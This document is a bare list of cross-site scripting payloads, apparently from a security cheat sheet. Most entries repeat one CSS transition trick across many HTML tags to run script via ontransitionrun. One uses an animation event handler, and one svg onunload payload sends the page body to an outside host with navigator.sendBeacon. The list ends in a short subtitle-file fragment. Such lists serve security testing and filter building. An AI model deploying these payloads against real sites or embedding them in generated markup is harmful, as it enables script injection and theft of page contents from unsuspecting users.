"<style>:target {transform: rotate(180deg);}</style><rp id=x style=""transition:transform 2s"" ontransitionrun=print()></rp>"
"<style>:target {transform: rotate(180deg);}</style><rt id=x style=""transition:transform 2s"" ontransitionrun=print()></rt>"
"<style>:target {transform: rotate(180deg);}</style><rtc id=x style=""transition:transform 2s"" ontransitionrun=print()></rtc>"
"<style>:target {transform: rotate(180deg);}</style><ruby id=x style=""transition:transform 2s"" ontransitionrun=print()></ruby>"
"<style>:target {transform: rotate(180deg);}</style><s id=x style=""transition:transform 2s"" ontransitionrun=print()></s>"
"<style>:target {transform: rotate(180deg);}</style><samp id=x style=""transition:transform 2s"" ontransitionrun=print()></samp>"
"<style>:target {transform: rotate(180deg);}</style><section id=x style=""transition:transform 2s"" ontransitionrun=print()></section>"
"<style>:target {transform: rotate(180deg);}</style><select id=x style=""transition:transform 2s"" ontransitionrun=print()></select>"
"<style>:target {transform: rotate(180deg);}</style><set id=x style=""transition:transform 2s"" ontransitionrun=print()></set>"
"<style>:target {transform: rotate(180deg);}</style><shadow id=x style=""transition:transform 2s"" ontransitionrun=print()></shadow>"
"<style>:target {transform: rotate(180deg);}</style><slot id=x style=""transition:transform 2s"" ontransitionrun=print()></slot>"
"<style>:target {transform: rotate(180deg);}</style><small id=x style=""transition:transform 2s"" ontransitionrun=print()></small>"
"<style>:target {transform: rotate(180deg);}</style><source id=x style=""transition:transform 2s"" ontransitionrun=print()></source>"
"<style>:target {transform: rotate(180deg);}</style><spacer id=x style=""transition:transform 2s"" ontransitionrun=print()></spacer>"
"<style>:target {transform: rotate(180deg);}</style><span id=x style=""transition:transform 2s"" ontransitionrun=print()></span>"
"<style>:target {transform: rotate(180deg);}</style><strike id=x style=""transition:transform 2s"" ontransitionrun=print()></strike>"
"<style>:target {transform: rotate(180deg);}</style><strong id=x style=""transition:transform 2s"" ontransitionrun=print()></strong>"
"<style>:target {transform: rotate(180deg);}</style><style id=x style=""transition:transform 2s"" ontransitionrun=print()></style>"
"<style>:target {transform: rotate(180deg);}</style><sub id=x style=""transition:transform 2s"" ontransitionrun=print()></sub>"
"<style>:target {transform: rotate(180deg);}</style><summary id=x style=""transition:transform 2s"" ontransitionrun=print()></summary>"
"<style>:target {transform: rotate(180deg);}</style><sup id=x style=""transition:transform 2s"" ontransitionrun=print()></sup>"
"<style>:target {transform: rotate(180deg);}</style><svg id=x style=""transition:transform 2s"" ontransitionrun=print()></svg>"
"<style>:target {transform: rotate(180deg);}</style><table id=x style=""transition:transform 2s"" ontransitionrun=print()></table>"
"<style>:target {transform: rotate(180deg);}</style><tbody id=x style=""transition:transform 2s"" ontransitionrun=print()></tbody>"
"<style>:target {transform: rotate(180deg);}</style><td id=x style=""transition:transform 2s"" ontransitionrun=print()></td>"
"<style>:target {transform: rotate(180deg);}</style><template id=x style=""transition:transform 2s"" ontransitionrun=print()></template>"
"<style>:target {transform: rotate(180deg);}</style><textarea id=x style=""transition:transform 2s"" ontransitionrun=print()></textarea>"
"<style>:target {transform: rotate(180deg);}</style><tfoot id=x style=""transition:transform 2s"" ontransitionrun=print()></tfoot>"
"<style>:target {transform: rotate(180deg);}</style><th id=x style=""transition:transform 2s"" ontransitionrun=print()></th>"
"<style>:target {transform: rotate(180deg);}</style><thead id=x style=""transition:transform 2s"" ontransitionrun=print()></thead>"
"<style>:target {transform: rotate(180deg);}</style><time id=x style=""transition:transform 2s"" ontransitionrun=print()></time>"
"<style>:target {transform: rotate(180deg);}</style><title id=x style=""transition:transform 2s"" ontransitionrun=print()></title>"
"<style>:target {transform: rotate(180deg);}</style><tr id=x style=""transition:transform 2s"" ontransitionrun=print()></tr>"
"<style>:target {transform: rotate(180deg);}</style><track id=x style=""transition:transform 2s"" ontransitionrun=print()></track>"
"<style>:target {transform: rotate(180deg);}</style><tt id=x style=""transition:transform 2s"" ontransitionrun=print()></tt>"
"<style>:target {transform: rotate(180deg);}</style><u id=x style=""transition:transform 2s"" ontransitionrun=print()></u>"
"<style>:target {transform: rotate(180deg);}</style><ul id=x style=""transition:transform 2s"" ontransitionrun=print()></ul>"
"<style>:target {transform: rotate(180deg);}</style><var id=x style=""transition:transform 2s"" ontransitionrun=print()></var>"
"<style>:target {transform: rotate(180deg);}</style><video id=x style=""transition:transform 2s"" ontransitionrun=print()></video>"
"<style>:target {transform: rotate(180deg);}</style><video2 id=x style=""transition:transform 2s"" ontransitionrun=print()></video2>"
"<style>:target {transform: rotate(180deg);}</style><wbr id=x style=""transition:transform 2s"" ontransitionrun=print()></wbr>"
"<style>:target {transform: rotate(180deg);}</style><xmp id=x style=""transition:transform 2s"" ontransitionrun=print()></xmp>"
"<style>@keyframes x{}</style><data style=""animation-name:x"" onwebkitanimationstart=""alert(1)""></data>"
"<svg onunload=navigator.sendBeacon('//ssl.portswigger-labs.net/',document.body.innerHTML)>"
1
00:00:00.000 --> 00:00:05.000
<b>XSS</b>
"""></video>"
